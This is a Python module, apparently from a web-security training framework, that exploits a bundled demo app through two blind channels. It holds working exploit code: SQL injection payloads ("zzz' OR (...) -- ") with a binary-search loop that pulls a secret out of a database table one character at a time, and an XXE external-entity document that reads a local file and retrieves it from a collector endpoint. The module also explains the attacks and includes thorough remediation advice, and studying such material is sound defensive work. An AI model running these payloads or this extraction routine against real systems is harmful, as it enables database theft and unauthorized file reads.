"""Out-of-band data exfiltration -- chaining two blind channels to steal secrets.

WHAT IT IS
----------
"Data exfiltration" is the *egress* half of an exploit: you have a primitive that
touches data you must not see, but the sink gives you **no direct output** -- no
error message, no reflected row, no echoed file. You have to *carry the bytes out*
over a side channel, one bit (or one character) at a time. This module demonstrates
the two canonical out-of-band (OOB) channels an OSWE-grade chain uses, against the
demo app's two blind sinks:

1) **Blind boolean SQL injection (the primary channel).** ``GET /api/check-user?username=``
   concatenates the parameter straight into SQL and returns ONLY a boolean::

       def _check_user(h):                              # GET /api/check-user?username=<u>
           sql = f"SELECT 1 FROM users WHERE username='{username}' LIMIT 1"
           row = h.state.db.execute(sql).fetchone()     # errors collapse to "no"
           h._send_json(200, {"exists": bool(row)})     # boolean-only feedback

   There is no row data and no error text -- just ``{"exists": true|false}``. That
   one bit is a perfect *oracle*: we inject ``' OR (<condition>) -- `` so the query
   becomes ``... WHERE username='zzz' OR (<condition>) -- '``. The bogus username
   matches nothing, so ``exists`` reflects ``<condition>`` alone. By making the
   condition a comparison against a hidden value, each request leaks one yes/no fact.
   We point it at the single-row ``app_secrets`` table and extract its ``exfil_data``
   column **character by character** -- recovering ``C.FLAGS["data_exfiltration"]``
   without the database ever returning it in a response body.

2) **XXE out-of-band file read (the second channel).** ``POST /xxe-oob`` parses XML
   with external entities ON, but -- unlike a classic XXE -- it does **not echo** the
   parsed content back. Instead it stashes anything it read into a server-side
   collector and replies ``document accepted for processing``. The exfiltrated bytes
   come back only later, via a *separate* request: ``GET /collected``. That is the
   textbook OOB pattern -- the read happens in one request, the data leaves in another
   (in the real world, over DNS/HTTP to an attacker-controlled server). We send an
   external-entity document referencing ``file:///secret/oob_flag.txt`` (a planted
   file in the sandbox), then poll ``/collected`` to retrieve what the parser
   exfiltrated -- ``C.FLAGS["advanced_xxe"]``.

The lesson the chaining drives home: a sink that returns "no useful output" is not
safe. A single boolean, a timing difference, or a second endpoint that surfaces what
a blind parser read is enough to reconstruct arbitrary secrets. Real engagements pair
these -- e.g. blind SQLi to enumerate a token, then an OOB DNS exfil to carry a large
blob out past an egress filter.

HOW WE DISCOVER IT
------------------
For the SQLi oracle we use three differential signals:

* **A real username is ``exists: true`` (positive control).** ``?username=admin`` ->
  ``{"exists": true}`` proves the lookup works and a true row reads "true".
* **A bogus username is ``exists: false`` (negative control).** ``?username=nope`` ->
  ``{"exists": false}`` -- our injected bogus user matches nothing, so any "true" we
  later get comes from the *injected condition*, not an accidental row match.
* **A tautology vs a contradiction (the injection signal).** ``' OR (1=1) -- `` ->
  true and ``' OR (1=2) -- `` -> false. The boolean flips with attacker-controlled
  SQL: the parameter is injectable and the boolean is a usable oracle.

For the XXE OOB channel: POST the external-entity document, confirm the 200 "accepted"
reply, then confirm ``GET /collected`` now contains an ``xxe-oob`` entry carrying the
file's contents -- the read happened blind and surfaced out-of-band.

HOW WE EXPLOIT IT
-----------------
*SQLi*: first binary-search the secret's **length** (``length(value) > N``), then for
each position binary-search the character's Unicode code point with
``unicode(substr(value, i, 1)) > N`` -- log2(95) ~ 7 boolean requests per character
instead of ~95 equality probes. Reassemble the characters into the flag. *XXE*: POST
the entity doc, GET ``/collected``, and pull the exfiltrated file contents from the
collector. ``exploit_result`` carries the SQLi-recovered ``data_exfiltration`` flag;
``extra`` records BOTH channels (the SQLi-extracted secret and the XXE-OOB-recovered
``advanced_xxe`` flag) to prove the chain end-to-end.

THE FIX
-------
See :data:`REMEDIATION`. In one line: kill the *sinks* (parameterised queries; an XML
parser with external entities and DTDs disabled), not just the visible output -- a
blind channel exfiltrates just as completely as a verbose one.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Defeat out-of-band exfiltration by removing the SINKS, not just hiding the output -- "
    "a blind channel (one boolean, a timing delta, or a second endpoint that surfaces what a "
    "parser read) reconstructs a secret just as completely as a verbose one, so 'we only return "
    "true/false' or 'we don't echo the file' is NOT a defence. "
    "(1) BLIND SQL INJECTION: never build SQL by string concatenation/interpolation; use "
    "PARAMETERISED queries / prepared statements (or a vetted ORM) so user input is bound as a "
    "value and can never alter query structure -- this closes boolean, time-based, error-based and "
    "OOB SQLi at once. In the real stack ('SELECT 1 FROM users WHERE username = $1' on PostgreSQL "
    "via parameter binding; parameterised commands in .NET/PHP-PDO) the injected OR/UNION/subquery "
    "becomes literal data. Defence in depth: run the DB account with least privilege (no read on a "
    "secrets table from the web role), do NOT collapse SQL errors into the same boolean (it only "
    "hides the channel, not the bug), add per-IP rate limiting / anomaly detection to slow "
    "char-by-char extraction, and store true secrets in a secrets manager, not a queryable column. "
    "(2) XXE OUT-OF-BAND: disable external entities AND DTD processing entirely in the XML parser. "
    "In Python disable general external entities (do not set feature_external_ges True; prefer "
    "defusedxml). In the real platforms: libxml2 LIBXML_NONET + no XML_PARSE_NOENT (PHP "
    "libxml_disable_entity_loader / no LIBXML_NOENT|LIBXML_DTDLOAD); .NET XmlReaderSettings with "
    "DtdProcessing.Prohibit and a null XmlResolver. Reject DOCTYPE outright if your schema doesn't "
    "need it. Defence in depth: a strict egress firewall / no outbound DNS+HTTP from the parser host "
    "denies the channel the OOB data would leave by. "
    "Parameterise the query and harden the parser -- once the sink is closed, the side channel has "
    "nothing to carry."
)

# --- endpoints ---------------------------------------------------------------
#: The blind-boolean SQLi sink -- the PRIMARY exfil channel (returns only exists:bool).
SQLI_ENDPOINT: str = "/api/check-user?username="
#: The XXE OOB ingestion sink (parses external entities, stashes them server-side).
XXE_ENDPOINT: str = "/xxe-oob"
#: Where the XXE-exfiltrated bytes surface out-of-band (a SEPARATE request).
COLLECTED_ENDPOINT: str = "/collected"

#: The single-row secrets table / column the blind SQLi extracts char-by-char.
SECRET_TABLE: str = "app_secrets"
SECRET_COLUMN: str = "value"
SECRET_ROW: str = "exfil_data"  # WHERE name='exfil_data' -> the data_exfiltration flag

#: The planted file the XXE OOB channel reads (jailed to the sandbox).
OOB_FILE: str = "file:///secret/oob_flag.txt"

#: An upper bound on the secret length the length-search probes (the flag is ~32 chars).
MAX_SECRET_LEN: int = 128
#: Code-point search window -- printable ASCII covers the flag alphabet.
_CP_LOW: int = 31
_CP_HIGH: int = 127


def _subquery() -> str:
    """The scalar subquery that yields the hidden secret value."""
    return (
        f"SELECT {SECRET_COLUMN} FROM {SECRET_TABLE} "
        f"WHERE name='{SECRET_ROW}'"
    )


def _inject(condition: str) -> str:
    """Wrap a boolean ``condition`` in the username-parameter injection.

    Produces ``zzz' OR (<condition>) -- `` so the server's query becomes
    ``... WHERE username='zzz' OR (<condition>) -- '``. ``zzz`` matches no real
    user, so ``exists`` reflects ``<condition>`` alone -- a clean boolean oracle.
    """
    return f"zzz' OR ({condition}) -- "


#: The representative payloads this engine sends (public so the CLI/report can show
#: exactly what was attempted): the two controls, the tautology/contradiction probe,
#: a length probe, a char probe, and the XXE OOB entity document.
PAYLOADS: List[str] = [
    "admin",  # positive control: a real username -> exists:true
    "nope",   # negative control: a bogus username -> exists:false
    _inject("1=1"),  # tautology -> true  (injection confirmed)
    _inject("1=2"),  # contradiction -> false
    _inject(f"length(({_subquery()})) > 0"),                     # length probe
    _inject(f"unicode(substr(({_subquery()}),1,1)) > 64"),       # first-char probe
    (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r [ <!ENTITY x SYSTEM "{OOB_FILE}"> ]>\n'
        "<r>&x;</r>"
    ),  # XXE OOB external-entity document
]


# --------------------------------------------------------------------------- #
# low-level oracle
# --------------------------------------------------------------------------- #
def _check_user(client: WebClient, username: str) -> Response:
    """Drive the blind sink: ``GET /api/check-user?username=<username>``."""
    return client.get("/api/check-user", params={"username": username})


def _exists(resp: Response) -> Optional[bool]:
    """Parse the boolean oracle out of the JSON reply (None if unparseable)."""
    try:
        body = resp.json()
    except ValueError:
        return None
    if isinstance(body, dict) and isinstance(body.get("exists"), bool):
        return body["exists"]
    return None


def oracle(client: WebClient, condition: str) -> bool:
    """One blind request: True iff the injected SQL ``condition`` is true.

    The heart of boolean blind SQLi -- a single bit of feedback per request.
    """
    return _exists(_check_user(client, _inject(condition))) is True


# --------------------------------------------------------------------------- #
# detection (controls that prove the boolean oracle is real)
# --------------------------------------------------------------------------- #
def detect_oracle(client: WebClient) -> Tuple[bool, str]:
    """Confirm the blind boolean SQLi oracle with four differential signals.

    positive control (real user -> true), negative control (bogus user -> false),
    and the injection signal (``1=1`` true, ``1=2`` false). Returns
    ``(is_injectable, evidence)``.
    """
    pos = _exists(_check_user(client, "admin"))            # real user
    neg = _exists(_check_user(client, "nope"))             # bogus user
    taut = oracle(client, "1=1")                           # tautology
    contra = oracle(client, "1=2")                         # contradiction
    ok = (pos is True) and (neg is False) and taut and (contra is False)
    if ok:
        evidence = (
            "blind boolean SQLi oracle confirmed on "
            f"{SQLI_ENDPOINT}: real user 'admin' -> exists:true, bogus 'nope' -> "
            "exists:false, injected \"' OR (1=1) -- \" -> true while "
            "\"' OR (1=2) -- \" -> false (boolean flips with attacker SQL)"
        )
        return True, evidence
    return False, ""


def detect_xxe_oob(client: WebClient) -> Tuple[bool, str, Optional[str]]:
    """Confirm the XXE out-of-band channel: POST entity doc, then GET ``/collected``.

    Returns ``(worked, evidence, exfiltrated)`` where ``exfiltrated`` is the file
    content the blind parser read and surfaced out-of-band.
    """
    exfiltrated = exfil_via_xxe(client)
    if exfiltrated is not None:
        evidence = (
            f"XXE OOB channel confirmed: POST {XXE_ENDPOINT} (external entity -> "
            f"{OOB_FILE}) replied 'accepted', then GET {COLLECTED_ENDPOINT} "
            f"surfaced the exfiltrated content out-of-band: {exfiltrated!r}"
        )
        return True, evidence, exfiltrated
    return False, "", None


# --------------------------------------------------------------------------- #
# exploitation: channel 1 -- blind boolean SQLi char-by-char extraction
# --------------------------------------------------------------------------- #
def extract_length(
    client: WebClient, max_len: int = MAX_SECRET_LEN
) -> Tuple[int, int]:
    """Binary-search the hidden secret's length. Returns ``(length, requests)``."""
    sub = _subquery()
    requests = 0
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        requests += 1
        if oracle(client, f"length(({sub})) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo, requests


def extract_char(client: WebClient, position: int) -> Tuple[Optional[str], int]:
    """Binary-search the Unicode code point of the 1-indexed ``position`` character.

    ``unicode(substr(value, position, 1)) > N`` is the per-character oracle.
    Returns ``(char_or_None, requests)``.
    """
    sub = _subquery()
    requests = 0
    lo, hi = _CP_LOW, _CP_HIGH
    while lo < hi:
        mid = (lo + hi) // 2
        requests += 1
        if oracle(client, f"unicode(substr(({sub}),{position},1)) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    if lo <= _CP_LOW:  # no character at this position
        return None, requests
    return chr(lo), requests


def exfil_via_sqli(
    client: WebClient,
) -> Tuple[Optional[str], int, List[Dict[str, str]]]:
    """Extract the full secret over the boolean channel, one character at a time.

    Returns ``(secret_or_None, total_requests, per_char_log)``. The ``per_char_log``
    records each recovered character and how many boolean requests it cost (for the
    report). Returns None if the table/column is absent (a fixed/safe target).
    """
    length, len_requests = extract_length(client)
    total = len_requests
    per_char: List[Dict[str, str]] = []
    if length <= 0:
        return None, total, per_char
    chars: List[str] = []
    for position in range(1, length + 1):
        ch, reqs = extract_char(client, position)
        total += reqs
        if ch is None:
            break
        chars.append(ch)
        per_char.append(
            {"position": str(position), "char": ch, "requests": str(reqs)}
        )
    return "".join(chars), total, per_char


# --------------------------------------------------------------------------- #
# exploitation: channel 2 -- XXE out-of-band file read
# --------------------------------------------------------------------------- #
def _xxe_document() -> bytes:
    """The external-entity XML that makes the blind parser read the planted file."""
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r [ <!ENTITY x SYSTEM "{OOB_FILE}"> ]>\n'
        "<r>&x;</r>"
    ).encode("utf-8")


def fetch_collected(client: WebClient) -> List[dict]:
    """GET ``/collected`` -- the OOB drop where exfiltrated bytes surface."""
    resp = client.get(COLLECTED_ENDPOINT)
    try:
        body = resp.json()
    except ValueError:
        return []
    items = body.get("collected") if isinstance(body, dict) else None
    return items if isinstance(items, list) else []


def exfil_via_xxe(client: WebClient) -> Optional[str]:
    """Run the OOB XXE chain: POST the entity doc, then GET ``/collected``.

    Returns the file content the blind parser exfiltrated, or None if the channel
    did not surface anything (a fixed/safe target).
    """
    before = len(fetch_collected(client))
    resp = client.post(
        XXE_ENDPOINT, body=_xxe_document(),
        headers={"Content-Type": "application/xml"},
    )
    if resp.status != 200:
        return None
    for item in fetch_collected(client)[before:]:
        if isinstance(item, dict) and item.get("channel") == "xxe-oob":
            data = item.get("data")
            if isinstance(data, str) and data:
                return data
    # Fall back to scanning every drop (collector may reorder/share state).
    for item in fetch_collected(client):
        if isinstance(item, dict) and item.get("channel") == "xxe-oob":
            data = item.get("data")
            if isinstance(data, str) and data:
                return data
    return None


# --------------------------------------------------------------------------- #
# the contract entry point
# --------------------------------------------------------------------------- #
def assess(client: WebClient) -> Finding:
    """Detect + exploit both OOB exfiltration channels; recover the planted flag.

    The headline ``exploit_result`` carries the ``data_exfiltration`` flag recovered
    char-by-char over the blind boolean SQLi channel; ``extra`` documents BOTH
    channels, including the ``advanced_xxe`` flag recovered via the XXE OOB chain.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    oracle_ok, oracle_ev = detect_oracle(client)
    if oracle_ok:
        techniques.append("boolean-oracle-confirmed")
    xxe_ok, xxe_ev, _xxe_detect = detect_xxe_oob(client)
    if xxe_ok:
        techniques.append("xxe-oob-confirmed")

    # 2) Exploitation: channel 1 (blind SQLi, the prize) --------------------
    secret, sqli_requests, per_char = exfil_via_sqli(client)
    sqli_flag = secret if secret == C.FLAGS["data_exfiltration"] else None
    if sqli_flag is not None:
        techniques.append("sqli-char-by-char-extracted")

    # 3) Exploitation: channel 2 (XXE OOB, the corroborating chain) ---------
    xxe_data = exfil_via_xxe(client)
    xxe_flag = (
        xxe_data if xxe_data and C.FLAGS["advanced_xxe"] in xxe_data else None
    )
    if xxe_flag is not None:
        techniques.append("xxe-oob-exfiltrated")

    # Discovery requires the PRIMARY (SQLi) channel to have recovered the planted
    # data_exfiltration flag, with its oracle proven real.
    discovered = bool(oracle_ok and sqli_flag is not None)

    # 4) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if oracle_ok:
        evidence_parts.append(f"sqli-oracle: {oracle_ev}")
    if xxe_ok:
        evidence_parts.append(f"xxe-oob: {xxe_ev}")
    evidence = " || ".join(evidence_parts)

    sqli_payload = _inject(
        f"unicode(substr(({_subquery()}),1,1)) > {_CP_LOW}"
    )

    exploit_result = {
        "flag": sqli_flag,
        "channel": "blind-boolean-sqli",
        "extracted_secret": secret,
        "secret_source": f"{SECRET_TABLE}.{SECRET_COLUMN} WHERE name='{SECRET_ROW}'",
        "sqli_endpoint": SQLI_ENDPOINT,
        "sqli_requests": sqli_requests,
        "sqli_payload": sqli_payload,
        "per_char": per_char,
        "second_channel": {
            "channel": "xxe-out-of-band",
            "endpoint": XXE_ENDPOINT,
            "collected_via": COLLECTED_ENDPOINT,
            "file": OOB_FILE,
            "exfiltrated": xxe_data,
            "flag": xxe_flag,
        },
        "techniques": techniques,
        "summary": (
            f"recovered {sqli_flag!r} char-by-char over the blind boolean SQLi oracle on "
            f"{SQLI_ENDPOINT} ({sqli_requests} boolean requests, no row data ever returned); "
            f"corroborated with the XXE OOB channel ({XXE_ENDPOINT} -> {COLLECTED_ENDPOINT}) "
            f"which exfiltrated {xxe_data!r} -- two sinks that return no direct output, both "
            "fully drained out-of-band"
        ),
    }

    return Finding(
        vuln="Out-of-Band Data Exfiltration (blind SQLi + XXE OOB chain)",
        endpoint=SQLI_ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=sqli_payload,
        extra={
            "techniques": techniques,
            # channel 1: blind boolean SQLi (the headline prize)
            "sqli_oracle_confirmed": oracle_ok,
            "sqli_endpoint": SQLI_ENDPOINT,
            "sqli_extracted_secret": secret,
            "sqli_flag_recovered": sqli_flag is not None,
            "sqli_requests": sqli_requests,
            "sqli_chars": len(per_char),
            "secret_source": f"{SECRET_TABLE}.{SECRET_COLUMN}[name='{SECRET_ROW}']",
            # channel 2: XXE out-of-band file read (the corroborating chain)
            "xxe_oob_confirmed": xxe_ok,
            "xxe_endpoint": XXE_ENDPOINT,
            "xxe_collected_endpoint": COLLECTED_ENDPOINT,
            "xxe_oob_file": OOB_FILE,
            "xxe_exfiltrated": xxe_data,
            "xxe_flag": xxe_flag,
            "xxe_flag_recovered": xxe_flag is not None,
            # both channels prove the chain
            "channels": ["blind-boolean-sqli", "xxe-out-of-band"],
            "both_channels_recovered": bool(
                sqli_flag is not None and xxe_flag is not None
            ),
        },
    )
